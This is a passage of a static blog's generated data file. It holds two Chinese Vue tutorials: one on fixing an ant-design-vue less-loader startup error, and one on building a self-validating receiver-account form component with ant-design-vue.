--save-dev\n```\n\n启动项目报错如下：\n![](1.jpg)\n项目刚开始就报错，真是让人不愉快，但是不用着急，仔细看下错误提示信息，发现有这样一句`https://github.com/ant-design/ant-motion/issues/44`，点开找下点赞比较多的，主要有两条思路：\n一，降低 less 版本；\n二，配置 less-loader 的 javascriptEnabled 为 true，如下：\n![](2.jpg)\n\n我这里是采用了方案二，创建一个 vue.config.js 然后加上配置参数，运行 OK。\n\n# 参考\n\n极客时间——Vue 开发实战\n","source":"_posts/2019/05/vue-in-action-antd.md","raw":"---\ntitle: Vue实战@ant-disign第一坑\npermalink: vue-in-action-antd\ntags:\n  - Vue\ncategories:\n  - 框架与库\n  - Vue\ndate: 2019-05-20 10:25:48\nupdated: 2019-05-20 10:25:48\n---\n\n# 概述\n\n第一次用 ant-design-vue，刚启动就踩坑，记录下。[配套测试源码](https://github.com/jovysun/Vue-my-pro)\n\n<!-- more -->\n\n# 详述\n\nvue-cli3.x 创建项目\n\n按需引用 ant-design-vue 组件\n\n```shell\nnpm install ant-design-vue --save\nnpm install babel-plugin-import --save-dev\n```\n\n启动项目报错如下：\n![](1.jpg)\n项目刚开始就报错，真是让人不愉快，但是不用着急，仔细看下错误提示信息，发现有这样一句`https://github.com/ant-design/ant-motion/issues/44`，点开找下点赞比较多的，主要有两条思路：\n一，降低 less 版本；\n二，配置 less-loader 的 javascriptEnabled 为 true，如下：\n![](2.jpg)\n\n我这里是采用了方案二，创建一个 vue.config.js 然后加上配置参数，运行 OK。\n\n# 参考\n\n极客时间——Vue 开发实战\n","slug":"vue-in-action-antd","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8xl006fwovv3d9gg1kl","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>第一次用 ant-design-vue，刚启动就踩坑，记录下。<a href=\"https://github.com/jovysun/Vue-my-pro\" target=\"_blank\" rel=\"noopener\">配套测试源码</a></p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><p>vue-cli3.x 创建项目</p>\n<p>按需引用 ant-design-vue 组件</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install ant-design-vue --save</span><br><span class=\"line\">npm install babel-plugin-import --save-dev</span><br></pre></td></tr></table></figure>\n<p>启动项目报错如下：<br><img src=\"/vue-in-action-antd/1.jpg\" alt=\"\"><br>项目刚开始就报错，真是让人不愉快，但是不用着急，仔细看下错误提示信息，发现有这样一句<code>https://github.com/ant-design/ant-motion/issues/44</code>，点开找下点赞比较多的，主要有两条思路：<br>一，降低 less 版本；<br>二，配置 less-loader 的 javascriptEnabled 为 true，如下：<br><img src=\"/vue-in-action-antd/2.jpg\" alt=\"\"></p>\n<p>我这里是采用了方案二，创建一个 vue.config.js 然后加上配置参数，运行 OK。</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>极客时间——Vue 开发实战</p>\n","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>第一次用 ant-design-vue，刚启动就踩坑，记录下。<a href=\"https://github.com/jovysun/Vue-my-pro\" target=\"_blank\" rel=\"noopener\">配套测试源码</a></p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><p>vue-cli3.x 创建项目</p>\n<p>按需引用 ant-design-vue 组件</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install ant-design-vue --save</span><br><span class=\"line\">npm install babel-plugin-import --save-dev</span><br></pre></td></tr></table></figure>\n<p>启动项目报错如下：<br><img src=\"/vue-in-action-antd/1.jpg\" alt=\"\"><br>项目刚开始就报错，真是让人不愉快，但是不用着急，仔细看下错误提示信息，发现有这样一句<code>https://github.com/ant-design/ant-motion/issues/44</code>，点开找下点赞比较多的，主要有两条思路：<br>一，降低 less 版本；<br>二，配置 less-loader 的 javascriptEnabled 为 true，如下：<br><img src=\"/vue-in-action-antd/2.jpg\" alt=\"\"></p>\n<p>我这里是采用了方案二，创建一个 vue.config.js 然后加上配置参数，运行 OK。</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>极客时间——Vue 开发实战</p>"},{"title":"Vue实战@封装一个自动校验表单项","date":"2019-05-25T15:29:52.000Z","updated":"2019-05-25T15:29:52.000Z","_content":"\n# 概述\n\n自己封装一个支持自动校验表单项，以`ant-design-vue`组件为例。[配套测试源码](https://github.com/jovysun/Vue-my-pro)\n\n<!-- more -->\n\n# 详述\n\n## 自定义一个组件 ReceiverAccount\n\n```html\n<template>\n  <a-input-group compact>\n    <a-select style=\"width: 130px;\" v-model=\"type\" @change=\"handleTypeChange\">\n      <a-select-option value=\"aplipay\">支付宝</a-select-option>\n      <a-select-option value=\"bank\">银行账户</a-select-option>\n    </a-select>\n    <a-input\n      style=\"width: calc(100% - 130px)\"\n      v-model=\"number\"\n      @change=\"handleNumberChange\"\n    />\n  </a-input-group>\n</template>\n\n<script>\n  export default {\n    props: {\n      value: {\n        type: Object\n      }\n    },\n    watch: {\n      value(val) {\n        Object.assign(this, val);\n      }\n    },\n    data() {\n      const { type, number } = this.value || {};\n      return {\n        type: type || \"aplipay\",\n        number: number || \"\"\n      };\n    },\n    methods: {\n      handleTypeChange(val) {\n        this.$emit(\"change\", { ...this.value, type: val });\n      },\n      handleNumberChange(e) {\n        this.$emit(\"change\", { ...this.value, number: e.target.value });\n      }\n    }\n  };\n</script>\n```\n\n## 使用自定义组件 ReceiverAccount\n\n```html\n<template>\n  <div>\n    <a-form :form=\"form\" layout=\"horizontal\">\n      <a-form-item\n        label=\"付款账户\"\n        :label-col=\"formItemLayout.labelCol\"\n        :wrapper-col=\"formItemLayout.wrapperCol\"\n      >\n        <a-input\n          v-decorator=\"[\n            'payAccount', \n            {\n              initialValue: step.payAccount,\n              rules: [{required: true, message: '请输入付款账号'}]\n            }\n          ]\"\n        />\n      </a-form-item>\n      <a-form-item\n        label=\"收款账户\"\n        :label-col=\"formItemLayout.labelCol\"\n        :wrapper-col=\"formItemLayout.wrapperCol\"\n      >\n        <ReceiverAccount\n          v-decorator=\"[\n            'receiverAccount', \n            {\n              initialValue: step.receiverAccount,\n              rules: [{required: true, message: '请输入收款账号', validator: checkReceiverAccount}]\n            }\n          ]\"\n        />\n      </a-form-item>\n      <a-form-item>\n        <a-button type=\"primary\" @click=\"handleSubmit\">\n          下一步\n        </a-button>\n      </a-form-item>\n    </a-form>\n  </div>\n</template>\n\n<script>\n  import ReceiverAccount from \"@/components/ReceiverAccount\";\n  export default {\n    components: {\n      ReceiverAccount\n    },\n    data() {\n      return {\n        formItemLayout: {\n          labelCol: { span: 4 },\n          wrapperCol: { span: 14 }\n        },\n        form: this.$form.createForm(this)\n      };\n    },\n    computed: {\n      step() {\n        return this.$store.state.form.step;\n      }\n    },\n    methods: {\n      handleSubmit() {\n        const { form, $router, $store } = this;\n        form.validateFields((err, values) => {\n          if (!err) {\n            $store.commit(\"form/saveStepFormData\", values);\n            $router.push(\"/form/step-form/confirm\");\n          }\n        });\n      },\n      checkReceiverAccount(rule, value, callback) {\n        if (value && value.number) {\n          callback();\n        } else {\n          callback(false);\n        }\n      }\n    }\n  };\n</script>\n```\n\n# 参考\n\n极客时间——Vue 开发实战\n","source":"_posts/2019/05/vue-in-action-autoValidForm.md","raw":"---\ntitle: Vue实战@封装一个自动校验表单项\npermalink: vue-in-action-autoValidForm\ntags:\n  - Vue\ncategories:\n  - 框架与库\n  - Vue\ndate: 2019-05-25 23:29:52\nupdated: 2019-05-25 23:29:52\n---\n\n# 概述\n\n自己封装一个支持自动校验表单项，以`ant-design-vue`组件为例。[配套测试源码](https://github.com/jovysun/Vue-my-pro)\n\n<!-- more -->\n\n# 详述\n\n## 自定义一个组件 ReceiverAccount\n\n```html\n<template>\n  <a-input-group compact>\n    <a-select style=\"width: 130px;\" v-model=\"type\" @change=\"handleTypeChange\">\n      <a-select-option value=\"aplipay\">支付宝</a-select-option>\n      <a-select-option value=\"bank\">银行账户</a-select-option>\n    </a-select>\n    <a-input\n      style=\"width: calc(100% - 130px)\"\n      v-model=\"number\"\n      @change=\"handleNumberChange\"\n    />\n  </a-input-group>\n</template>\n\n<script>\n  export default {\n    props: {\n      value: {\n        type: Object\n      }\n    },\n    watch: {\n      value(val) {\n        Object.assign(this, val);\n      }\n    },\n    data() {\n      const { type, number } = this.value || {};\n      return {\n        type: type || \"aplipay\",\n        number: number || \"\"\n      };\n    },\n    methods: {\n      handleTypeChange(val) {\n        this.$emit(\"change\", { ...this.value, type: val });\n      },\n      handleNumberChange(e) {\n        this.$emit(\"change\", { ...this.value, number: e.target.value });\n      }\n    }\n  };\n</script>\n```\n\n## 使用自定义组件 ReceiverAccount\n\n```html\n<template>\n  <div>\n    <a-form :form=\"form\" layout=\"horizontal\">\n      <a-form-item\n        label=\"付款账户\"\n        :label-col=\"formItemLayout.labelCol\"\n        :wrapper-col=\"formItemLayout.wrapperCol\"\n      >\n        <a-input\n          v-decorator=\"[\n            'payAccount', \n            {\n              initialValue: step.payAccount,\n              rules: [{required: true, message: '请输入付款账号'}]\n            }\n          ]\"\n        />\n      </a-form-item>\n      <a-form-item\n        label=\"收款账户\"\n        :label-col=\"formItemLayout.labelCol\"\n        :wrapper-col=\"formItemLayout.wrapperCol\"\n      >\n        <ReceiverAccount\n          v-decorator=\"[\n            'receiverAccount', \n            {\n              initialValue: step.receiverAccount,\n              rules: [{required: true, message: '请输入收款账号', validator: checkReceiverAccount}]\n            }\n          ]\"\n        />\n      </a-form-item>\n      <a-form-item>\n        <a-button type=\"primary\" @click=\"handleSubmit\">\n          下一步\n        </a-button>\n      </a-form-item>\n    </a-form>\n  </div>\n</template>\n\n<script>\n  import ReceiverAccount from \"@/components/ReceiverAccount\";\n  export default {\n    components: {\n      ReceiverAccount\n    },\n    data() {\n      return {\n        formItemLayout: {\n          labelCol: { span: 4 },\n          wrapperCol: { span: 14 }\n        },\n        form: this.$form.createForm(this)\n      };\n    },\n    computed: {\n      step() {\n        return this.$store.state.form.step;\n      }\n    },\n    methods: {\n      handleSubmit() {\n        const { form, $router, $store } = this;\n        form.validateFields((err, values) => {\n          if (!err) {\n            $store.commit(\"form/saveStepFormData\", values);\n            $router.push(\"/form/step-form/confirm\");\n          }\n        });\n      },\n      checkReceiverAccount(rule, value, callback) {\n        if (value && value.number) {\n          callback();\n        } else {\n          callback(false);\n        }\n      }\n    }\n  };\n</script>\n```\n\n# 参考\n\n极客时间——Vue 开发实战\n","slug":"vue-in-action-autoValidForm","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8xm006iwovvgjczztkp","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>自己封装一个支持自动校验表单项，以<code>ant-design-vue</code>组件为例。<a href=\"https://github.com/jovysun/Vue-my-pro\" target=\"_blank\" rel=\"noopener\">配套测试源码</a></p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"自定义一个组件-ReceiverAccount\"><a href=\"#自定义一个组件-ReceiverAccount\" class=\"headerlink\" title=\"自定义一个组件 ReceiverAccount\"></a>自定义一个组件 ReceiverAccount</h2><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">a-input-group</span> <span class=\"attr\">compact</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">a-select</span> <span class=\"attr\">style</span>=<span class=\"string\">\"width: 130px;\"</span> <span class=\"attr\">v-model</span>=<span class=\"string\">\"type\"</span> @<span class=\"attr\">change</span>=<span class=\"string\">\"handleTypeChange\"</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">a-select-option</span> <span class=\"attr\">value</span>=<span class=\"string\">\"aplipay\"</span>&gt;</span>支付宝<span class=\"tag\">&lt;/<span class=\"name\">a-select-option</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">a-select-option</span> <span class=\"attr\">value</span>=<span class=\"string\">\"bank\"</span>&gt;</span>银行账户<span class=\"tag\">&lt;/<span class=\"name\">a-select-option</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">a-select</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">a-input</span></span></span><br><span class=\"line\"><span class=\"tag\">      <span class=\"attr\">style</span>=<span class=\"string\">\"width: calc(100% - 130px)\"</span></span></span><br><span class=\"line\"><span class=\"tag\">      <span class=\"attr\">v-model</span>=<span class=\"string\">\"number\"</span></span></span><br><span class=\"line\"><span class=\"tag\">      @<span class=\"attr\">change</span>=<span class=\"string\">\"handleNumberChange\"</span></span></span><br><span class=\"line\"><span class=\"tag\">    /&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">a-input-group</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">    props: &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">      value: &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        type: <span class=\"built_in\">Object</span></span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">    watch: &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">      value(val) &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"built_in\">Object</span>.assign(<span class=\"keyword\">this</span>, val);</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">    data() &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"keyword\">const</span> &#123; type, number &#125; = <span class=\"keyword\">this</span>.value || &#123;&#125;;</span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"keyword\">return</span> &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        type: type || <span class=\"string\">\"aplipay\"</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">        number: number || <span class=\"string\">\"\"</span></span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">    methods: &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">      handleTypeChange(val) &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">this</span>.$emit(<span class=\"string\">\"change\"</span>, &#123; ...this.value, <span class=\"attr\">type</span>: val &#125;);</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">      handleNumberChange(e) &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">this</span>.$emit(<span class=\"string\">\"change\"</span>, &#123; ...this.value, <span class=\"attr\">number</span>: e.target.value &#125;);</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">  &#125;;</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"使用自定义组件-ReceiverAccount\"><a href=\"#使用自定义组件-ReceiverAccount\" class=\"headerlink\" title=\"使用自定义组件 ReceiverAccount\"></a>使用自定义组件 ReceiverAccount</h2><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">a-form</span> <span class=\"attr\">:form</span>=<span class=\"string\">\"form\"</span> <span class=\"attr\">layout</span>=<span class=\"string\">\"horizontal\"</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">a-form-item</span></span></span><br><span class=\"line\"><span class=\"tag\">        <span class=\"attr\">label</span>=<span class=\"string\">\"付款账户\"</span></span></span><br><span class=\"line\"><span class=\"tag\">        <span class=\"attr\">:label-col</span>=<span class=\"string\">\"formItemLayout.labelCol\"</span></span></span><br><span class=\"line\"><span class=\"tag\">        <span class=\"attr\">:wrapper-col</span>=<span class=\"string\">\"formItemLayout.wrapperCol\"</span></span></span><br><span class=\"line\"><span class=\"tag\">      &gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">a-input</span></span></span><br><span class=\"line\"><span class=\"tag\">          <span class=\"attr\">v-decorator</span>=<span class=\"string\">\"[</span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">            'payAccount', </span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">            &#123;</span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">              initialValue: step.payAccount,</span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">              rules: [&#123;required: true, message: '请输入付款账号'&#125;]</span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">            &#125;</span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">          ]\"</span></span></span><br><span class=\"line\"><span class=\"tag\">        /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;/<span class=\"name\">a-form-item</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">a-form-item</span></span></span><br><span class=\"line\"><span class=\"tag\">        <span class=\"attr\">label</span>=<span class=\"string\">\"收款账户\"</span></span></span><br><span class=\"line\"><span class=\"tag\">        <span class=\"attr\">:label-col</span>=<span class=\"string\">\"formItemLayout.labelCol\"</span></span></span><br><span class=\"line\"><span class=\"tag\">        <span class=\"attr\">:wrapper-col</span>=<span class=\"string\">\"formItemLayout.wrapperCol\"</span></span></span><br><span class=\"line\"><span class=\"tag\">      &gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">ReceiverAccount</span></span></span><br><span class=\"line\"><span class=\"tag\">          <span class=\"attr\">v-decorator</span>=<span class=\"string\">\"[</span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">            'receiverAccount', </span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">            &#123;</span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">              initialValue: step.receiverAccount,</span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">              rules: [&#123;required: true, message: '请输入收款账号', validator: checkReceiverAccount&#125;]</span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">            &#125;</span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"string\">          ]\"</span></span></span><br><span class=\"line\"><span class=\"tag\">        /&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;/<span class=\"name\">a-form-item</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">a-form-item</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">a-button</span> <span class=\"attr\">type</span>=<span class=\"string\">\"primary\"</span> @<span class=\"attr\">click</span>=<span class=\"string\">\"handleSubmit\"</span>&gt;</span></span><br><span class=\"line\">          下一步</span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">a-button</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;/<span class=\"name\">a-form-item</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">a-form</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">import</span> ReceiverAccount <span class=\"keyword\">from</span> <span class=\"string\">\"@/components/ReceiverAccount\"</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">    components: &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">      ReceiverAccount</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">    data() &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"keyword\">return</span> &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">        formItemLayout: &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">          labelCol: &#123; span: 4 &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">          wrapperCol: &#123; span: 14 &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;,</span></span><br><span class=\"line\"><span class=\"javascript\">        form: <span class=\"keyword\">this</span>.$form.createForm(<span class=\"keyword\">this</span>)</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">    computed: &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">      step() &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.$store.state.form.step;</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">    methods: &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">      handleSubmit() &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">const</span> &#123; form, $router, $store &#125; = <span class=\"keyword\">this</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        form.validateFields(<span class=\"function\">(<span class=\"params\">err, values</span>) =&gt;</span> &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">          <span class=\"keyword\">if</span> (!err) &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            $store.commit(<span class=\"string\">\"form/saveStepFormData\"</span>, values);</span></span><br><span class=\"line\"><span class=\"javascript\">            $router.push(<span class=\"string\">\"/form/step-form/confirm\"</span>);</span></span><br><span class=\"line\"><span class=\"undefined\">          &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;);</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">      checkReceiverAccount(rule, value, callback) &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">if</span> (value &amp;&amp; value.number) &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">          callback();</span></span><br><span class=\"line\"><span class=\"javascript\">        &#125; <span class=\"keyword\">else</span> &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">          callback(<span class=\"literal\">false</span>);</span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">  &#125;;</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>极客时间——Vue 开发实战</p>\n","site":{"data":{}},"excerpt":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>自己封装一个支持自动校验表单项，以<code>ant-design-vue</code>组件为例。<a href=\"https://github.com/jovysun/Vue-my-pro\" target=\"_blank\" rel=\"noopener\">配套测试源码</a></p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"自定义一个组件-ReceiverAccount\"><a href=\"#自定义一个组件-ReceiverAccount\" class=\"headerlink\" title=\"自定义一个组件 ReceiverAccount\"></a>自定义一个组件 ReceiverAccount</h2><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span 